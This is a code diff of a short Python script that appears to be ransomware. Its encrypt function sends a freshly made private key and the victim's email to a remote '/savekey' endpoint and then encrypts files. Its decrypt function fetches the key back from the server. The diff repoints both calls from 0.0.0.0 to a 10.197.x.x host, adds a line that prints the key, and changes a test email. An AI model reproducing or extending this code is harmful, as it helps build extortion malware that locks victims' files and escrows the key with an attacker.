@@ -16,7 +16,7 @@ def encrypt(email):
 	#d = base64.b64decode(stringB64)
 
 	#send to server
-	requests.post("http://0.0.0.0:4995/savekey", json = {'email' : email, 'privatekey' : stringB64})
+	requests.post("http://10.197.107.209:5000/savekey", json = {'email' : email, 'privatekey' : stringB64})
 	#print(r.status_code)
 
 	enc_dec.beginFileModification(key, enc_dec.encrypt)
@@ -28,12 +28,13 @@ def decrypt(email):
 	print("decrypting")
 
 
-	r = requests.post("http://0.0.0.0:4995/fetchkey", json = {'email' : email})
+	r = requests.post("http://10.197.107.209:5000/fetchkey", json = {'email' : email})
 	stringKey = r.text
 
 	key = base64.b64decode(stringKey)
 	
 	enc_dec.beginFileModification(key, enc_dec.decrypt)
+	print(key)
 	#fetch key from server
 	#proceed with decryption
 
@@ -41,5 +42,5 @@ def decrypt(email):
 
 if __name__ == '__main__':
 	#test propogation and retrieval of key
-	encrypt("rayan@gmail.com")
-	decrypt("rayan@gmail.com")
+	encrypt("rayan123@gmail.com")
+	decrypt("rayan123@gmail.com")
